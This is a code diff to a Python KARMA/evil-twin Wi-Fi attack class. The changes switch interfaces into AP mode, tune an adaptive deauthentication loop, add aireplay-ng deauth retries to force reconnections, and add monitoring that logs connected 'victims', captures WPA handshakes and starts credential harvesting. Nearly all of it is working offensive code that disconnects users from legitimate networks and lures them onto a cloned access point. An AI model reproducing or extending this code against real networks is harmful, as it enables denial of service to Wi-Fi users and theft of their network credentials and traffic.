@@ -43,6 +43,9 @@ class AttackKARMA(Attack):
         self.connected_clients = set()
         self.running = True
         self._cleanup_done = False
+        self._attack_started = False  # Flag to prevent duplicate execution
+        self._fallback_mode_used = False  # Flag to track if fallback mode was used
+        self._networks_scanned = False  # Flag to track if networks have been scanned
         
         # Enhanced KARMA attack components
         self.captured_handshakes = {}  # MAC -> handshake file path
@@ -230,6 +233,25 @@ class AttackKARMA(Attack):
             except Exception as e:
                 Color.pl('{!} {O}/sys/class/net method failed: {O}%s{W}' % str(e))
             
+            # Method 5: Detect base interfaces from monitor interfaces (airmon-ng scenarios)
+            try:
+                # If we found monitor interfaces, try to detect their base interfaces
+                monitor_interfaces = [iface for iface in interfaces if iface.endswith('mon')]
+                for monitor_iface in monitor_interfaces:
+                    # Extract base interface name (remove 'mon' suffix)
+                    base_iface = monitor_iface[:-3] if monitor_iface.endswith('mon') else monitor_iface
+                    
+                    # Check if base interface exists in sysfs
+                    base_path = os.path.join('/sys/class/net', base_iface)
+                    if os.path.exists(base_path) and base_iface not in interfaces:
+                        # Verify it's a wireless interface
+                        wireless_path = os.path.join(base_path, 'wireless')
+                        if os.path.exists(wireless_path):
+                            interfaces.append(base_iface)
+                            Color.pl('{+} {C}Detected base interface {G}%s{W} from monitor interface {G}%s{W}' % (base_iface, monitor_iface))
+            except Exception as e:
+                Color.pl('{!} {O}Base interface detection failed: {O}%s{W}' % str(e))
+            
             Color.pl('{+} {G}Found {C}%d{W} wireless interfaces: {G}%s{W}' % (len(interfaces), ', '.join(interfaces)))
             return interfaces
             
@@ -314,8 +336,8 @@ class AttackKARMA(Attack):
         try:
             Color.pl('{+} {C}Scanning system for optimal interfaces...{W}')
             
-            # Get all available interfaces
-            all_interfaces = self.get_available_interfaces()
+            # Use already available interfaces instead of scanning again
+            all_interfaces = self.available_interfaces
             if not all_interfaces:
                 Color.pl('{!} {R}No wireless interfaces found!{W}')
                 return None, None
@@ -393,7 +415,7 @@ class AttackKARMA(Attack):
                     Color.pl('{+} {C}Attempting to find alternative interface for rogue AP...{W}')
                     
                     # Try to find a different interface for rogue AP
-                    available_interfaces = self.get_available_interfaces()
+                    available_interfaces = self.available_interfaces
                     alternative_rogue = None
                     
                     for iface in available_interfaces:
@@ -630,6 +652,15 @@ class AttackKARMA(Attack):
     def resolve_interface_name(self, interface):
         """Resolve interface name to an actual existing interface"""
         try:
+            # If interface ends with 'mon', try to find the base interface first
+            if interface.endswith('mon'):
+                base_name = interface[:-3]  # Remove 'mon' suffix
+                # Check if base interface exists
+                result = subprocess.run(['iwconfig', base_name], capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    Color.pl('{+} {C}Resolved monitor interface: {O}%s{W} -> {G}%s{W}' % (interface, base_name))
+                    return base_name
+            
             # First, try the interface as-is
             result = subprocess.run(['iwconfig', interface], capture_output=True, text=True, timeout=3)
             if result.returncode == 0:
@@ -906,6 +937,12 @@ class AttackKARMA(Attack):
                         return True
                     else:
                         Color.pl('{!} {R}✗ Interface not in monitor mode{W}')
+                elif target_mode == 'master':
+                    if 'Mode:Master' in result.stdout or 'Mode:AP' in result.stdout:
+                        Color.pl('{+} {G}✓ Interface {G}%s{O} is in AP mode{W}' % interface)
+                        return True
+                    else:
+                        Color.pl('{!} {R}✗ Interface not in AP mode{W}')
             else:
                 Color.pl('{!} {R}✗ Could not get interface status for {G}%s{W}' % interface)
                 Color.pl('{!} {O}Debug: iwconfig stderr: {O}%s{W}' % result.stderr.strip())
@@ -1055,6 +1092,12 @@ class AttackKARMA(Attack):
                     Color.pl('{!} {R}Failed to switch to monitor mode{W}')
                     return False
                 interface = actual_interface  # Use the actual interface name found
+            elif target_mode == 'master':
+                # For master mode (AP mode), use iwconfig
+                success = self.switch_to_master_mode(interface)
+                if not success:
+                    Color.pl('{!} {R}Failed to switch to master mode{W}')
+                    return False
             else:
                 Color.pl('{!} {R}Unknown target mode: %s{W}' % target_mode)
                 return False
@@ -1077,6 +1120,61 @@ class AttackKARMA(Attack):
                 
         except Exception as e:
             Color.pl('{!} {O}Error switching interface mode: {O}%s{W}' % str(e))
+            return False
+    
+    def switch_to_master_mode(self, interface):
+        """Switch interface to master mode (AP mode) for hostapd"""
+        try:
+            Color.pl('{+} {C}Switching to master mode (AP mode) for hostapd{W}')
+            
+            # If interface ends with 'mon', use the base interface for AP mode
+            base_interface = interface
+            if interface.endswith('mon'):
+                base_interface = interface[:-3]  # Remove 'mon' suffix
+                Color.pl('{+} {C}Using base interface {G}%s{W} for AP mode (from monitor interface {G}%s{W}){W}' % (base_interface, interface))
+            
+            # First, bring interface down
+            subprocess.run(['ifconfig', base_interface, 'down'], capture_output=True, timeout=5)
+            time.sleep(1)
+            
+            # Try modern 'iw' command first (preferred)
+            result = subprocess.run(['iw', base_interface, 'set', 'type', '__ap'], 
+                                  capture_output=True, text=True, timeout=10)
+            
+            if result.returncode == 0:
+                Color.pl('{+} {G}Successfully set AP mode using iw{W}')
+            else:
+                # Fallback to iwconfig master mode
+                Color.pl('{!} {O}iw failed, trying iwconfig master mode{W}')
+                result = subprocess.run(['iwconfig', base_interface, 'mode', 'master'], 
+                                      capture_output=True, text=True, timeout=10)
+                
+                if result.returncode != 0:
+                    Color.pl('{!} {R}Failed to set master mode: {O}%s{W}' % result.stderr.strip())
+                    return False
+            
+            # Bring interface back up
+            subprocess.run(['ifconfig', base_interface, 'up'], capture_output=True, timeout=5)
+            time.sleep(2)
+            
+            # Verify AP mode (check for both Master and AP modes)
+            result = subprocess.run(['iwconfig', base_interface], capture_output=True, text=True, timeout=5)
+            if result.returncode == 0 and ('Mode:Master' in result.stdout or 'Mode:AP' in result.stdout):
+                Color.pl('{+} {G}Successfully switched to AP mode{W}')
+                return True
+            else:
+                # Also try iw command for verification
+                result = subprocess.run(['iw', base_interface, 'info'], capture_output=True, text=True, timeout=5)
+                if result.returncode == 0 and 'type AP' in result.stdout:
+                    Color.pl('{+} {G}Successfully switched to AP mode (verified with iw){W}')
+                    return True
+                else:
+                    Color.pl('{!} {R}AP mode verification failed{W}')
+                    Color.pl('{!} {O}iwconfig output: {O}%s{W}' % result.stdout.strip())
+                    return False
+                
+        except Exception as e:
+            Color.pl('{!} {R}Error switching to master mode: {O}%s{W}' % str(e))
             return False
     
     def stop_probe_capture(self):
@@ -1140,6 +1238,13 @@ class AttackKARMA(Attack):
         
     def run(self):
         """Main KARMA attack execution - Complete Multi-Stage Evil Twin Attack"""
+        # Prevent duplicate execution
+        if self._attack_started:
+            Color.pl('{!} {R}KARMA attack already started - preventing duplicate execution{W}')
+            return False
+        
+        self._attack_started = True
+        
         # Ensure cleanup runs on exit/interrupts
         self._register_cleanup_handlers()
         try:
@@ -1193,25 +1298,30 @@ class AttackKARMA(Attack):
                     return False
                 else:
                     Color.pl('{+} {G}Fallback attack mode activated{W}')
+                    self._fallback_mode_used = True
             
-            # Stage 2: Identify Real Networks with Clients
-            if hasattr(self, 'target') and self.target:
-                Color.pattack('KARMA', self.target, 'Stage 2', 'Scanning for real networks')
-            if not self.identify_real_networks():
-                Color.pl('{!} {R}No real networks with clients found{W}')
-                # Try fallback attack mode
-                Color.pl('{+} {O}Attempting fallback attack mode...{W}')
-                if not self.fallback_attack_mode():
-                    Color.pl('{!} {R}Fallback attack mode also failed{W}')
-                    self.cleanup()
-                    return False
-                else:
-                    Color.pl('{+} {G}Fallback attack mode activated{W}')
+            # Stage 2: Identify Real Networks with Clients (skip if fallback already handled this)
+            if not self._fallback_mode_used:
+                if hasattr(self, 'target') and self.target:
+                    Color.pattack('KARMA', self.target, 'Stage 2', 'Scanning for real networks')
+                if not self.identify_real_networks():
+                    Color.pl('{!} {R}No real networks with clients found{W}')
+                    # Try fallback attack mode
+                    Color.pl('{+} {O}Attempting fallback attack mode...{W}')
+                    if not self.fallback_attack_mode():
+                        Color.pl('{!} {R}Fallback attack mode also failed{W}')
+                        self.cleanup()
+                        return False
+                    else:
+                        Color.pl('{+} {G}Fallback attack mode activated{W}')
+                        self._fallback_mode_used = True
+            else:
+                Color.pl('{+} {G}Skipping Stage 2 - already handled by fallback mode{W}')
             
             # Stage 3: Setup Evil Twin Infrastructure
             if self.single_interface_mode:
                 # Single interface: Switch to rogue AP mode
-                if not self.switch_interface_mode('managed', 'Rogue AP Setup'):
+                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                     Color.pl('{!} {R}Failed to switch to rogue AP mode{W}')
                     self.cleanup()
                     return False
@@ -1225,6 +1335,15 @@ class AttackKARMA(Attack):
                 Color.pl('{!} {R}Failed to setup Evil Twin infrastructure{W}')
                 self.cleanup()
                 return False
+            
+            # Phase 3: DNS Spoofing Setup (if enabled)
+            Color.pl('\n{+} {C}Phase 3: DNS Spoofing Setup{W}')
+            if Configuration.karma_dns_spoofing:
+                Color.pl('{+} {G}DNS spoofing enabled - setting up DNS server{W}')
+                Color.pl('{!} {O}DNS spoofing functionality not yet implemented{W}')
+                Color.pl('{!} {O}Continuing with Layer 2 KARMA attack only{W}')
+            else:
+                Color.pl('{+} {O}DNS spoofing disabled - running Layer 2 KARMA only{W}')
             
             # Stage 4: Deauthentication Attack
             if hasattr(self, 'target') and self.target:
@@ -1456,6 +1575,9 @@ class AttackKARMA(Attack):
                     for client in unassociated_target.clients:
                         Color.pl('  {G}* {W}Unassociated: {C}%s{W}' % client.station)
                 
+                # Mark that networks have been scanned
+                self._networks_scanned = True
+                
                 if self.real_networks:
                     Color.pl('{+} {G}Found {C}%d{W} real networks with clients for targeting{W}' % len(self.real_networks))
                     
@@ -1519,7 +1641,7 @@ class AttackKARMA(Attack):
             return False
     
     def adaptive_deauth_network_clients(self, network):
-        """Send adaptive deauth packets with escalating intensity and retry logic"""
+        """Send adaptive deauth packets with balanced approach - give clients time to connect"""
         try:
             Color.pl('{+} {C}Starting adaptive deauth attack on {G}%s{W} ({C}%s{W}){W}' % 
                     (network.essid, network.bssid))
@@ -1527,6 +1649,8 @@ class AttackKARMA(Attack):
             deauth_count = 0
             last_connection_check = time.time()
             no_connection_duration = 0
+            last_deauth_time = 0
+            deauth_interval = 10  # Start with 10 second intervals between deauth rounds
             
             while self.deauth_active and self.running:
                 current_time = time.time()
@@ -1540,36 +1664,44 @@ class AttackKARMA(Attack):
                         no_connection_duration += 30
                         # Escalate attack intensity if no clients connected
                         self.escalate_deauth_intensity(network, no_connection_duration)
+                        # Reduce deauth interval for more aggressive attacks
+                        deauth_interval = max(5, 15 - (no_connection_duration // 30))
                     else:
                         no_connection_duration = 0  # Reset if clients connected
                         self.deauth_intensity[network.bssid] = max(1, self.deauth_intensity[network.bssid] - 1)  # Reduce intensity
+                        # Increase deauth interval when clients are connected
+                        deauth_interval = min(20, deauth_interval + 2)
                 
-                # Send deauth packets based on current intensity
-                intensity = self.deauth_intensity[network.bssid]
-                packets_per_round = min(intensity * 3, 15)  # Max 15 packets per round
-                
-                for client in network.clients:
-                    try:
-                        # Send multiple deauth packets based on intensity
-                        for i in range(packets_per_round):
-                            self.send_adaptive_deauth(network, client, intensity)
-                            deauth_count += 1
+                # Only send deauth packets at intervals to give clients time to connect
+                if current_time - last_deauth_time >= deauth_interval:
+                    last_deauth_time = current_time
+                    
+                    # Send deauth packets based on current intensity
+                    intensity = self.deauth_intensity[network.bssid]
+                    packets_per_round = min(intensity * 2, 10)  # Reduced max packets per round
+                    
+                    for client in network.clients:
+                        try:
+                            # Send fewer deauth packets to avoid overwhelming
+                            for i in range(packets_per_round):
+                                self.send_adaptive_deauth(network, client, intensity)
+                                deauth_count += 1
+                                
+                                # Longer delay between packets
+                                time.sleep(0.2)
                             
-                            # Small delay between packets to prevent overwhelming
-                            time.sleep(0.1)
-                        
-                        # Log deauth activity every 20 packets
-                        if deauth_count % 20 == 0:
-                            Color.pl('{+} {C}Adaptive deauth active - sent {G}%d{W} packets to {G}%s{W} (intensity: {G}%d{W})' % 
-                                    (deauth_count, network.essid, intensity))
-                        
-                    except Exception as e:
-                        if Configuration.verbose > 1:
-                            Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
-                                    (client.bssid, str(e)))
+                            # Log deauth activity every 10 packets (reduced frequency)
+                            if deauth_count % 10 == 0:
+                                Color.pl('{+} {C}Deauth sent to {G}%s{W} - waiting {G}%d{W}s for connections' % 
+                                        (network.essid, deauth_interval))
+                            
+                        except Exception as e:
+                            if Configuration.verbose > 1:
+                                Color.pl('{!} {R}Deauth failed for {G}%s{W}: {O}%s{W}' % 
+                                        (client.bssid, str(e)))
                 
-                # Adaptive sleep based on intensity
-                sleep_time = max(2, 8 - intensity)  # Higher intensity = shorter sleep
+                # Longer sleep to give clients time to connect
+                sleep_time = max(5, deauth_interval)  # Minimum 5 second sleep
                 time.sleep(sleep_time)
                 
         except Exception as e:
@@ -1612,10 +1744,21 @@ class AttackKARMA(Attack):
             
             Color.pl('{+} {G}Fallback PNL created with {C}%d{W} common SSIDs{W}' % len(self.pnl_networks))
             
-            # Try to identify real networks with clients
-            if not self.identify_real_networks():
-                Color.pl('{!} {R}Still no real networks found in fallback mode{W}')
-                return False
+            # Use existing real_networks if available, don't scan again
+            if hasattr(self, 'real_networks') and self.real_networks:
+                Color.pl('{+} {G}Using existing real networks from previous scan{W}')
+                Color.pl('{+} {G}Found {C}%d{W} real networks with clients{W}' % len(self.real_networks))
+            else:
+                # Check if we already scanned but found no networks with clients
+                if hasattr(self, '_networks_scanned') and self._networks_scanned:
+                    Color.pl('{+} {G}Using fallback PNL - previous scan found networks but no clients{W}')
+                    Color.pl('{+} {G}Fallback mode will create Evil Twins for common SSIDs{W}')
+                else:
+                    # Only scan if we haven't scanned yet
+                    Color.pl('{+} {C}No previous scan found - scanning for networks...{W}')
+                    if not self.identify_real_networks():
+                        Color.pl('{!} {R}Still no real networks found in fallback mode{W}')
+                        return False
             
             # Mark as fallback mode
             self.fallback_mode = True
@@ -1643,24 +1786,27 @@ class AttackKARMA(Attack):
             
             for iface in interfaces_to_restore:
                 try:
-                    Color.pl('{+} {C}Restoring interface {G}%s{W} to managed mode...{W}' % iface)
+                    # Clean up interface name - convert monitor interfaces to base interfaces
+                    base_iface = self.cleanup_interface_name(iface)
+                    
+                    Color.pl('{+} {C}Restoring interface {G}%s{W} to managed mode...{W}' % base_iface)
                     
                     # Bring interface down
-                    subprocess.run(['ip', 'link', 'set', iface, 'down'], capture_output=True)
+                    subprocess.run(['ip', 'link', 'set', base_iface, 'down'], capture_output=True)
                     
                     # Set to managed mode
-                    subprocess.run(['iw', 'dev', iface, 'set', 'type', 'managed'], capture_output=True)
+                    subprocess.run(['iw', 'dev', base_iface, 'set', 'type', 'managed'], capture_output=True)
                     
                     # Flush IP addresses
-                    subprocess.run(['ip', 'addr', 'flush', 'dev', iface], capture_output=True)
+                    subprocess.run(['ip', 'addr', 'flush', 'dev', base_iface], capture_output=True)
                     
                     # Bring interface up
-                    subprocess.run(['ip', 'link', 'set', iface, 'up'], capture_output=True)
+                    subprocess.run(['ip', 'link', 'set', base_iface, 'up'], capture_output=True)
                     
-                    Color.pl('{+} {G}Interface {G}%s{W} restored to managed mode{W}' % iface)
+                    Color.pl('{+} {G}Interface {G}%s{W} restored to managed mode{W}' % base_iface)
                     
                 except Exception as e:
-                    Color.pl('{!} {O}Warning: Failed to restore interface {G}%s{W}: {R}%s{W}' % (iface, str(e)))
+                    Color.pl('{!} {O}Warning: Failed to restore interface {G}%s{W}: {R}%s{W}' % (base_iface, str(e)))
             
             # Unblock rfkill
             try:
@@ -1991,16 +2137,16 @@ class AttackKARMA(Attack):
                         if hasattr(process_obj, 'terminate'):
                             process_obj.terminate()
                         
-                        # Wait for process to terminate
+                        # Wait for process to terminate (reduced timeout for faster cleanup)
                         try:
-                            process_obj.wait(timeout=timeout)
+                            process_obj.wait(timeout=min(timeout, 3))  # Max 3 seconds per process
                             Color.pl('{+} {G}Process terminated gracefully: {C}%s{W}' % process_name)
                         except subprocess.TimeoutExpired:
                             # Force kill if graceful termination fails
                             Color.pl('{!} {R}Process did not terminate gracefully, force killing: {O}%s{W}' % process_name)
                             if hasattr(process_obj, 'kill'):
                                 process_obj.kill()
-                            process_obj.wait(timeout=2)
+                            process_obj.wait(timeout=1)  # Reduced to 1 second
                     else:
                         Color.pl('{+} {G}Process already terminated: {C}%s{W}' % process_name)
                         
@@ -2326,6 +2472,8 @@ class AttackKARMA(Attack):
                     
                     if not handshake_found:
                         Color.pl('{!} {R}No handshake captured from {O}%s{W} after 60 seconds' % client_mac)
+                        # Retry handshake capture after a delay
+                        self.retry_handshake_capture(client_mac)
                     
                     return handshake_found
             
@@ -2347,6 +2495,83 @@ class AttackKARMA(Attack):
     def capture_handshake_for_client(self, client_mac):
         """Legacy method - redirects to async implementation"""
         self.start_async_handshake_capture(client_mac)
+    
+    def _get_rogue_ap_bssid(self):
+        """Get the BSSID of our rogue AP"""
+        try:
+            # Get the MAC address of our rogue interface
+            cmd = ['ip', 'link', 'show', self.rogue_interface]
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
+            
+            if result.returncode == 0:
+                # Extract MAC address from ip link output
+                for line in result.stdout.split('\n'):
+                    if 'link/ether' in line:
+                        mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
+                        if mac_match:
+                            return mac_match.group(1).lower()
+            
+            # Fallback: try to get from hostapd config if available
+            if hasattr(self, 'hostapd_config') and self.hostapd_config:
+                try:
+                    with open(self.hostapd_config, 'r') as f:
+                        content = f.read()
+                        bssid_match = re.search(r'bssid=([a-fA-F0-9:]{17})', content)
+                        if bssid_match:
+                            return bssid_match.group(1).lower()
+                except Exception:
+                    pass
+            
+            return None
+            
+        except Exception:
+            return None
+    
+    def retry_handshake_capture(self, client_mac):
+        """Retry handshake capture for a client after a delay"""
+        try:
+            # Wait 30 seconds before retry
+            time.sleep(30)
+            
+            # Check if client is still connected
+            if client_mac in self.connected_clients and client_mac not in self.captured_handshakes:
+                Color.pl('{+} {C}Retrying handshake capture for {G}%s{W}...' % client_mac)
+                
+                # Retry with more aggressive deauth
+                rogue_bssid = self._get_rogue_ap_bssid()
+                if rogue_bssid:
+                    # Send more deauth packets to force reconnection
+                    deauth_cmd = [
+                        'aireplay-ng',
+                        '-0', '10',  # Send 10 deauth packets
+                        '--ignore-negative-one',
+                        '-a', rogue_bssid,
+                        '-c', client_mac,
+                        self.probe_interface
+                    ]
+                    
+                    try:
+                        process = subprocess.Popen(deauth_cmd, 
+                                                 stdout=subprocess.DEVNULL, 
+                                                 stderr=subprocess.DEVNULL,
+                                                 preexec_fn=os.setsid)
+                        process.wait(timeout=10)
+                    except subprocess.TimeoutExpired:
+                        try:
+                            os.killpg(os.getpgid(process.pid), signal.SIGTERM)
+                        except:
+                            pass
+                        process.kill()
+                    
+                    # Wait for reconnection
+                    time.sleep(5)
+                    
+                    # Try handshake capture again
+                    self.capture_handshake_for_client(client_mac)
+                    
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error in retry handshake capture: {O}%s{W}' % str(e))
     
     def validate_handshake_async(self, capfile):
         """Validate handshake asynchronously to prevent blocking - Fixed implementation"""
@@ -2371,23 +2596,20 @@ class AttackKARMA(Attack):
     def get_ap_bssid_for_client(self, client_mac):
         """Get the AP BSSID for a specific client - CRITICAL FIX"""
         try:
-            # Check if client is connected to our rogue AP
-            if hasattr(self, 'rogue_ap_networks') and self.rogue_ap_networks:
-                for network in self.rogue_ap_networks:
-                    if client_mac in network.get('clients', []):
-                        return network.get('bssid')
+            # In KARMA attack, clients connect to our rogue AP
+            # Get the BSSID of our rogue interface
+            rogue_bssid = self._get_rogue_ap_bssid()
+            if rogue_bssid:
+                Color.pl('{+} {C}Client {G}%s{W} connected to our rogue AP {G}%s{W}' % (client_mac, rogue_bssid))
+                return rogue_bssid
             
-            # Check real networks for this client
+            # Fallback: check real networks for this client
             if hasattr(self, 'real_networks') and self.real_networks:
                 for network in self.real_networks:
                     if hasattr(network, 'clients'):
                         for client in network.clients:
                             if client.bssid == client_mac:
                                 return network.bssid
-            
-            # Fallback: use target BSSID if available
-            if hasattr(self, 'target') and self.target:
-                return self.target.bssid
             
             # Last resort: scan for APs with this client
             return self.scan_for_ap_with_client(client_mac)
@@ -2821,17 +3043,15 @@ class AttackKARMA(Attack):
             if self.single_interface_mode:
                 if hasattr(self, 'target') and self.target:
                     Color.pattack('KARMA', self.target, 'Rogue AP Setup', 'Resetting interface for AP mode')
-                if not self.switch_interface_mode('managed', 'Rogue AP Setup'):
+                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
                     Color.pl('{!} {R}Failed to reset rogue interface for AP mode{W}')
                     return False
             else:
-                # Dual interface mode: Ensure rogue interface is in managed mode
-                Color.pl('{+} {C}Ensuring rogue interface {G}%s{W} is in managed mode...{W}' % self.rogue_interface)
-                success, actual_interface = self.switch_to_managed_mode(self.rogue_interface)
-                if not success:
-                    Color.pl('{!} {R}Failed to set rogue interface to managed mode{W}')
+                # Dual interface mode: Ensure rogue interface is in master mode for AP
+                Color.pl('{+} {C}Ensuring rogue interface {G}%s{W} is in master mode for AP...{W}' % self.rogue_interface)
+                if not self.switch_interface_mode('master', 'Rogue AP Setup'):
+                    Color.pl('{!} {R}Failed to switch rogue interface to master mode{W}')
                     return False
-                self.rogue_interface = actual_interface  # Update interface name if changed
             
             # Start rogue AP
             if hasattr(self, 'target') and self.target:
@@ -2851,8 +3071,6 @@ class AttackKARMA(Attack):
     def create_hostapd_config(self):
         """Create hostapd configuration file for exact network clones"""
         try:
-            Color.pl('\n{+} {C}Phase 2: Setting up rogue AP infrastructure{W}')
-            
             # Find the best real network to clone (one that users likely have saved)
             target_network = self.find_best_network_to_clone()
             
@@ -3200,11 +3418,7 @@ server=8.8.8.8
             
             # Start primary Evil Twin
             if self.hostapd_config:
-                # Check for interface mode conflicts and try to resolve them
-                if not self.switch_interface_mode('managed', 'Interface Preparation'):
-                    Color.pl('{!} {R}Interface preparation failed - cannot start Evil Twin{W}')
-                    return False
-                
+                # Interface should already be in master mode from setup_rogue_ap
                 # Additional interface preparation for hostapd
                 if not self.final_interface_preparation():
                     Color.pl('{!} {R}Final interface preparation failed{W}')
@@ -3422,6 +3636,135 @@ server=8.8.8.8
                 Color.pl('{!} {R}Error creating interface config: {O}%s{W}' % str(e))
             return None
     
+    def monitor_connections(self):
+        """Monitor for client connections to rogue AP with improved detection"""
+        try:
+            Color.pl('{+} {C}Starting KARMA monitoring - waiting for victims...{W}')
+            
+            # Initialize victim management once, not in loop
+            if not hasattr(self, '_victim_mgmt_started'):
+                self.start_victim_management()
+                self._victim_mgmt_started = True
+            
+            last_status_time = time.time()
+            status_interval = 30  # Show status every 30 seconds
+            
+            while self.running:
+                current_time = time.time()
+                
+                # Check for connected clients using multiple methods
+                connected_macs = self.detect_rogue_ap_connections()
+                
+                # Check for new connections
+                new_connections = connected_macs - self.connected_clients
+                if new_connections:
+                    for mac in new_connections:
+                        Color.pl('{+} {G}🎯 New victim connected: {C}%s{W}' % mac)
+                        self.connected_clients.add(mac)
+                        
+                        # Check if we have probe data for this client
+                        if mac in self.client_probes:
+                            Color.pl('{+} {C}Client PNL:{W} {G}%s{W}' % ', '.join(self.client_probes[mac]))
+                        
+                        # Start handshake capture for this client
+                        if mac not in self.captured_handshakes:
+                            Color.pl('{+} {C}Attempting to capture handshake from {G}%s{W}...' % mac)
+                            # Use threading to avoid blocking the main monitoring loop
+                            handshake_thread = threading.Thread(
+                                target=self.capture_handshake_for_client,
+                                args=(mac,),
+                                name=f'handshake_{mac.replace(":", "")}'
+                            )
+                            handshake_thread.daemon = True
+                            handshake_thread.start()
+                        
+                        # Start credential harvesting for this client
+                        self.harvest_credentials_from_client(mac)
+                
+                # Show periodic status updates
+                if current_time - last_status_time >= status_interval:
+                    self.show_connection_status()
+                    last_status_time = current_time
+                
+                # Adaptive sleep based on activity
+                if len(self.connected_clients) > 0:
+                    time.sleep(3)  # More frequent checks when clients are connected
+                else:
+                    time.sleep(8)  # Less frequent checks when no clients
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error monitoring connections: {O}%s{W}' % str(e))
+    
+    def detect_rogue_ap_connections(self):
+        """Detect client connections to our rogue AP using multiple methods"""
+        try:
+            connected_macs = set()
+            
+            # Method 1: Check hostapd station dump
+            try:
+                cmd = ['iw', 'dev', str(self.rogue_interface), 'station', 'dump']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
+                
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if 'Station' in line:
+                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
+                            if mac_match:
+                                connected_macs.add(mac_match.group(1).lower())
+            except:
+                pass
+            
+            # Method 2: Check DHCP leases if dnsmasq is running
+            if hasattr(self, 'dnsmasq_config') and self.dnsmasq_config:
+                try:
+                    leases_file = self.dnsmasq_config.replace('.conf', '.leases')
+                    if os.path.exists(leases_file):
+                        with open(leases_file, 'r') as f:
+                            for line in f:
+                                parts = line.strip().split()
+                                if len(parts) >= 3:
+                                    mac = parts[1].lower()
+                                    connected_macs.add(mac)
+                except:
+                    pass
+            
+            # Method 3: Check ARP table for clients on our subnet
+            try:
+                cmd = ['arp', '-a']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
+                if result.returncode == 0:
+                    for line in result.stdout.split('\n'):
+                        if '10.0.0.' in line and '(' in line and ')' in line:
+                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
+                            if mac_match:
+                                connected_macs.add(mac_match.group(1).lower())
+            except:
+                pass
+            
+            return connected_macs
+            
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error detecting connections: {O}%s{W}' % str(e))
+            return set()
+    
+    def show_connection_status(self):
+        """Show detailed connection status"""
+        try:
+            if len(self.connected_clients) > 0:
+                Color.pl('{+} {G}🎯 KARMA Active - {C}%d{W} clients connected{W}' % len(self.connected_clients))
+                for mac in self.connected_clients:
+                    status = "Handshake captured" if mac in self.captured_handshakes else "Monitoring"
+                    Color.pl('  {G}* {W}%s - {C}%s{W}' % (mac, status))
+            else:
+                Color.pl('{+} {C}KARMA monitoring - waiting for victims to connect...{W}')
+                Color.pl('{+} {O}Deauth attacks active on {C}%d{W} networks{W}' % len(self.real_networks))
+                
+        except Exception as e:
+            if Configuration.verbose > 1:
+                Color.pl('{!} {R}Error showing status: {O}%s{W}' % str(e))
+    
     def start_victim_management(self):
         """Start victim management - kick users from real networks to force connection to fake AP"""
         try:
@@ -3496,54 +3839,6 @@ server=8.8.8.8
         except Exception as e:
             if Configuration.verbose > 1:
                 Color.pl('{!} {R}Error kicking clients from network: {O}%s{W}' % str(e))
-
-    def monitor_connections(self):
-        """Monitor for client connections to rogue AP"""
-        try:
-            Color.pl('{+} {C}Starting KARMA monitoring - waiting for victims...{W}')
-            
-            # Initialize victim management once, not in loop
-            if not hasattr(self, '_victim_mgmt_started'):
-                self.start_victim_management()
-                self._victim_mgmt_started = True
-            
-            while self.running:
-                # Check for connected clients using iw dev info
-                cmd = ['iw', 'dev', str(self.rogue_interface), 'station', 'dump']
-                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-                
-                if result.returncode == 0:
-                    connected_macs = set()
-                    for line in result.stdout.split('\n'):
-                        if 'Station' in line:
-                            mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
-                            if mac_match:
-                                connected_macs.add(mac_match.group(1).lower())
-                    
-                    # Check for new connections
-                    new_connections = connected_macs - self.connected_clients
-                    if new_connections:
-                        for mac in new_connections:
-                            Color.pl('{+} {G}New victim connected: {C}%s{W}' % mac)
-                            self.connected_clients.add(mac)
-                            
-                            # Check if we have probe data for this client
-                            if mac in self.client_probes:
-                                Color.pl('{+} {C}Client PNL:{W} {G}%s{W}' % ', '.join(self.client_probes[mac]))
-                            
-                            # Start credential harvesting for this client
-                            self.harvest_credentials_from_client(mac)
-                    
-                    # Show current status
-                    if len(self.connected_clients) > 0:
-                        Color.clear_entire_line()
-                        Color.p('{+} {G}KARMA Active - {C}%d{W} clients connected{W}' % len(self.connected_clients))
-                
-                time.sleep(5)  # Increased sleep time to reduce CPU usage
-                
-        except Exception as e:
-            if Configuration.verbose > 1:
-                Color.pl('{!} {R}Error monitoring connections: {O}%s{W}' % str(e))
     
     
     def start_monitoring(self):
@@ -3831,7 +4126,7 @@ server=8.8.8.8
                 return False
             
             # Check and fix interface mode conflicts
-            if not self.switch_interface_mode('managed', 'Conflict Resolution'):
+            if not self.switch_interface_mode('master', 'Conflict Resolution'):
                 return False
             
             # Check and fix permission issues
@@ -3921,27 +4216,36 @@ server=8.8.8.8
             
             Color.pl('{+} {C}Performing final interface preparation...{W}')
             
+            # Clean up interface name - convert monitor interfaces to base interfaces
+            interface = self.cleanup_interface_name(interface)
+            
             # Ensure interface is up
             subprocess.run(['ifconfig', interface, 'up'], capture_output=True, timeout=5)
             
-            # Set interface to managed mode explicitly
-            result = subprocess.run(['iwconfig', interface, 'mode', 'managed'], 
-                                  capture_output=True, text=True, timeout=5)
-            if result.returncode != 0:
-                Color.pl('{!} {R}Failed to set interface to managed mode{W}')
